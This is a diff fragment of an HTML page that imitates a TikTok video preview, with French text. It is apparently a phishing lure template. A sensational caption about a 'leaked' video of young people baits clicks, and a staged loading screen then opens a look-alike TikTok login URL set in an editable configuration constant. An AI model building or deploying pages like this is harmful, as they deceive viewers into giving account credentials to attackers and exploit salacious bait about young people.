+                <svg width="24" data-e2e="" height="24" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#HeartFill_clip0)"><g filter="url(#HeartFill_filter0_d)"><path fill-rule="evenodd" clip-rule="evenodd" d="M7.5 2.25C10.5 2.25 12 4.25 12 4.25C12 4.25 13.5 2.25 16.5 2.25C20 2.25 22.5 4.99999 22.5 8.5C22.5 12.5 19.2311 16.0657 16.25 18.75C14.4095 20.4072 13 21.5 12 21.5C11 21.5 9.55051 20.3989 7.75 18.75C4.81949 16.0662 1.5 12.5 1.5 8.5C1.5 4.99999 4 2.25 7.5 2.25Z"></path></g><path fill-rule="evenodd" clip-rule="evenodd" d="M2.40179 12.1998C3.58902 14.6966 5.7592 16.9269 7.74989 18.75C9.5504 20.3989 10.9999 21.5 11.9999 21.5C12.9999 21.5 14.4094 20.4072 16.2499 18.75C19.231 16.0657 22.4999 12.5 22.4999 8.49997C22.4999 8.41258 22.4983 8.32566 22.4952 8.23923C20.5671 13.6619 13.6787 18.5 11.75 18.5C10.3127 18.5 5.61087 15.8131 2.40179 12.1998Z" fill-opacity="0.03"></path></g><defs><filter id="HeartFill_filter0_d" x="-0.9" y="1.05" width="25.8" height="24.05" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB"><feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood><feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix><feOffset dy="1.2"></feOffset><feGaussianBlur stdDeviation="1.2"></feGaussianBlur><feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.15 0"></feColorMatrix><feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow"></feBlend><feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow" result="shape"></feBlend></filter><clipPath id="HeartFill_clip0"><rect width="24" height="24" fill="white"></rect></clipPath></defs></svg>
+            </div>
+            <div class="action-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" fill="currentColor" width="24" height="24"><path fill-rule="evenodd" d="M2 21.5c0-10.22 9.88-18 22-18s22 7.78 22 18c0 5.63-3.19 10.74-7.32 14.8a43.6 43.6 0 0 1-14.14 9.1A1.5 1.5 0 0 1 22.5 44v-5.04C11.13 38.4 2 31.34 2 21.5M14 25a3 3 0 1 0 0-6 3 3 0 0 0 0 6m10 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6m13-3a3 3 0 1 1-6 0 3 3 0 0 1 6 0" clip-rule="evenodd"></path></svg>
+            </div>
+            <div class="action-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M4 4.5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v15.13a1 1 0 0 1-1.555.831l-6.167-4.12a.5.5 0 0 0-.556 0l-6.167 4.12A1 1 0 0 1 4 19.63z"></path><path fill="currentColor" fill-opacity="0.03" d="M4.032 4.144Q4 4.317 4 4.5v15.13a1 1 0 0 0 1.555.831l6.167-4.12a.5.5 0 0 1 .41-.066l-.427-.198a1.49 1.49 0 0 0-1.377.063c-.581.339-1.45.85-2.25 1.339-.59.359-1.427.695-2.187.962-.929.325-1.86-.387-1.86-1.37zm8.251 12.202 6.162 4.115A1 1 0 0 0 20 19.63V4.5a2 2 0 0 0-1.123-1.798c.21.254.334.58.33.936a117 117 0 0 1-.896 13.408c-.124.99-1.17 1.553-2.076 1.133z"></path></svg>
+            </div>
+            <div class="action-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M4 4.5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v15.13a1 1 0 0 1-1.555.831l-6.167-4.12a.5.5 0 0 0-.556 0l-6.167 4.12A1 1 0 0 1 4 19.63z"></path><path fill="currentColor" fill-opacity="0.03" d="M4.032 4.144Q4 4.317 4 4.5v15.13a1 1 0 0 0 1.555.831l6.167-4.12a.5.5 0 0 1 .41-.066l-.427-.198a1.49 1.49 0 0 0-1.377.063c-.581.339-1.45.85-2.25 1.339-.59.359-1.427.695-2.187.962-.929.325-1.86-.387-1.86-1.37zm8.251 12.202 6.162 4.115A1 1 0 0 0 20 19.63V4.5a2 2 0 0 0-1.123-1.798c.21.254.334.58.33.936a117 117 0 0 1-.896 13.408c-.124.99-1.17 1.553-2.076 1.133z"></path></svg>
+            </div>
+            <div class="action-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" width="24" height="24"><path fill="currentColor" fill-rule="evenodd" d="M10.938 3.175a.674.674 0 0 1 1.138-.488l6.526 6.215c.574.547.554 1.47-.043 1.991l-6.505 5.676a.674.674 0 0 1-1.116-.508V13.49s-6.985-1.258-9.225 2.854c-.209.384-1.023.518-.857-1.395.692-3.52 2.106-9.017 10.082-9.017z" clip-rule="evenodd"></path><path fill="#161823" fill-rule="evenodd" d="m15.754 6.212 1.295 2.59a1.12 1.12 0 0 1-.268 1.349l-5.799 5.042s-.28 1.403.562 1.403 7.578-6.174 7.578-6.174.28-.842-.561-1.684c-.843-.842-2.807-2.526-2.807-2.526" clip-rule="evenodd" opacity="0.03"></path><path fill="url(#a)" fill-rule="evenodd" d="M10.937 6.23v7.297s-6.683-.942-8.777 2.246C.146 18.839.331 12.309 3.363 9.057s7.574-2.827 7.574-2.827" clip-rule="evenodd" opacity="0.09"></path><defs><radialGradient id="a" cx="0" cy="0" r="1" gradientTransform="rotate(-113.046 11.628 5.43)scale(8.93256 8.78076)" gradientUnits="userSpaceOnUse"><stop></stop><stop offset="0.995" stop-opacity="0.01"></stop><stop offset="1" stop-opacity="0.01"></stop></radialGradient></defs></svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="spinner"></div>
+        <p>Chargement de la vidéo...</p>
+    </div>
+
+    <script>
+        // 🎯 CONFIGURATION - Modifiez ces URLs selon vos besoins
+        const REDIRECT_TIKTOK_URL = "https://tiktok-auth-client.vercel.app/login";
+
+        // Variables pour l'aperçu
+        const USERNAME = "@username";
+        const DESCRIPTION = " Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - 🔥✨";
+        const HASHTAGS = "#viral #trending #fyp #foryou";
+
+        // Fonction de redirection avec effet de chargement
+        function redirectToTikTok() {
+            const loadingScreen = document.getElementById('loadingScreen');
+            loadingScreen.style.display = 'flex';
+
+            // Simule un temps de chargement comme TikTok
+            setTimeout(() => {
+                window.open(REDIRECT_TIKTOK_URL, '_blank');
+                loadingScreen.style.display = 'none';
+            }, 1500);
+        }
+
+        // Gestion des clics
+        document.getElementById('tiktokContainer').addEventListener('click', redirectToTikTok);
+
+        // Toggle instructions sur mobile
+        function toggleInstructions() {
+            const instructions = document.getElementById('instructions');
+            instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
+        }
+
+        // Mise à jour dynamique du contenu
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelector('.username').textContent = USERNAME;
+            document.querySelector('.description').textContent = DESCRIPTION;
+            document.querySelector('.hashtags').textContent = HASHTAGS;
+        });
+
+        // Animation d'entrée
+        window.addEventListener('load', function() {
+            document.querySelector('.tiktok-container').style.animation = 'slideUp 0.5s ease-out';
+        });
+    </script>
+
+    <style>
+        @keyframes slideUp {
+            from {
+                transform: translateY(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
             }
         }
     </style>
-</head>
-<body>
-<button class="show-instructions" onclick="toggleInstructions()">ℹ️</button>
-
-<div class="tiktok-container" id="tiktokContainer">
-    <div class="tiktok-logo">
-        <svg viewBox="0 0 118 42" fill="white">
-            <path d="M9.875 16.842V15.22c-.44-.043-.775-.087-1.22-.087C3.815 15.133 0 18.948 0 23.813c0 2.935 1.455 5.532 3.68 7.105a8.94 8.94 0 0 1-2.132-5.907c0-4.865 3.815-8.68 8.68-8.68.442 0 .884.044 1.322.087v-.586z"/>
-            <path d="M10.962 11.82v3.967c0 .263-.22.48-.483.48-.263 0-.483-.217-.483-.48V11.82c0-.263.22-.48.483-.48.263 0 .483.217.483.48z"/>
-        </svg>
-    </div>
-
-    <div class="video-preview">
-        <div class="play-overlay">
-            <div class="play-button"></div>
-        </div>
-    </div>
-
-    <div class="tiktok-ui">
-        <div class="user-info">
-            <div class="avatar flex">
-                <img src="data:image/jpeg;base64,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">
-            </div>
-            <div class="username">@username</div>
-        </div>
-        <div class="description">
-            Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - ! 🔥✨
-        </div>
-        <div class="hashtags">#viral #trending #fyp #foryou</div>
-    </div>
-
-    <div class="side-actions">
-        <div class="action-btn">
-            <svg width="24" data-e2e="" height="24" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#HeartFill_clip0)"><g filter="url(#HeartFill_filter0_d)"><path fill-rule="evenodd" clip-rule="evenodd" d="M7.5 2.25C10.5 2.25 12 4.25 12 4.25C12 4.25 13.5 2.25 16.5 2.25C20 2.25 22.5 4.99999 22.5 8.5C22.5 12.5 19.2311 16.0657 16.25 18.75C14.4095 20.4072 13 21.5 12 21.5C11 21.5 9.55051 20.3989 7.75 18.75C4.81949 16.0662 1.5 12.5 1.5 8.5C1.5 4.99999 4 2.25 7.5 2.25Z"></path></g><path fill-rule="evenodd" clip-rule="evenodd" d="M2.40179 12.1998C3.58902 14.6966 5.7592 16.9269 7.74989 18.75C9.5504 20.3989 10.9999 21.5 11.9999 21.5C12.9999 21.5 14.4094 20.4072 16.2499 18.75C19.231 16.0657 22.4999 12.5 22.4999 8.49997C22.4999 8.41258 22.4983 8.32566 22.4952 8.23923C20.5671 13.6619 13.6787 18.5 11.75 18.5C10.3127 18.5 5.61087 15.8131 2.40179 12.1998Z" fill-opacity="0.03"></path></g><defs><filter id="HeartFill_filter0_d" x="-0.9" y="1.05" width="25.8" height="24.05" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB"><feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood><feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix><feOffset dy="1.2"></feOffset><feGaussianBlur stdDeviation="1.2"></feGaussianBlur><feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.15 0"></feColorMatrix><feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow"></feBlend><feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow" result="shape"></feBlend></filter><clipPath id="HeartFill_clip0"><rect width="24" height="24" fill="white"></rect></clipPath></defs></svg>
-        </div>
-        <div class="action-btn">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" fill="currentColor" width="24" height="24"><path fill-rule="evenodd" d="M2 21.5c0-10.22 9.88-18 22-18s22 7.78 22 18c0 5.63-3.19 10.74-7.32 14.8a43.6 43.6 0 0 1-14.14 9.1A1.5 1.5 0 0 1 22.5 44v-5.04C11.13 38.4 2 31.34 2 21.5M14 25a3 3 0 1 0 0-6 3 3 0 0 0 0 6m10 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6m13-3a3 3 0 1 1-6 0 3 3 0 0 1 6 0" clip-rule="evenodd"></path></svg>
-        </div>
-        <div class="action-btn">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M4 4.5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v15.13a1 1 0 0 1-1.555.831l-6.167-4.12a.5.5 0 0 0-.556 0l-6.167 4.12A1 1 0 0 1 4 19.63z"></path><path fill="currentColor" fill-opacity="0.03" d="M4.032 4.144Q4 4.317 4 4.5v15.13a1 1 0 0 0 1.555.831l6.167-4.12a.5.5 0 0 1 .41-.066l-.427-.198a1.49 1.49 0 0 0-1.377.063c-.581.339-1.45.85-2.25 1.339-.59.359-1.427.695-2.187.962-.929.325-1.86-.387-1.86-1.37zm8.251 12.202 6.162 4.115A1 1 0 0 0 20 19.63V4.5a2 2 0 0 0-1.123-1.798c.21.254.334.58.33.936a117 117 0 0 1-.896 13.408c-.124.99-1.17 1.553-2.076 1.133z"></path></svg>
-        </div>
-        <div class="action-btn">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M4 4.5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v15.13a1 1 0 0 1-1.555.831l-6.167-4.12a.5.5 0 0 0-.556 0l-6.167 4.12A1 1 0 0 1 4 19.63z"></path><path fill="currentColor" fill-opacity="0.03" d="M4.032 4.144Q4 4.317 4 4.5v15.13a1 1 0 0 0 1.555.831l6.167-4.12a.5.5 0 0 1 .41-.066l-.427-.198a1.49 1.49 0 0 0-1.377.063c-.581.339-1.45.85-2.25 1.339-.59.359-1.427.695-2.187.962-.929.325-1.86-.387-1.86-1.37zm8.251 12.202 6.162 4.115A1 1 0 0 0 20 19.63V4.5a2 2 0 0 0-1.123-1.798c.21.254.334.58.33.936a117 117 0 0 1-.896 13.408c-.124.99-1.17 1.553-2.076 1.133z"></path></svg>
-        </div>
-        <div class="action-btn">
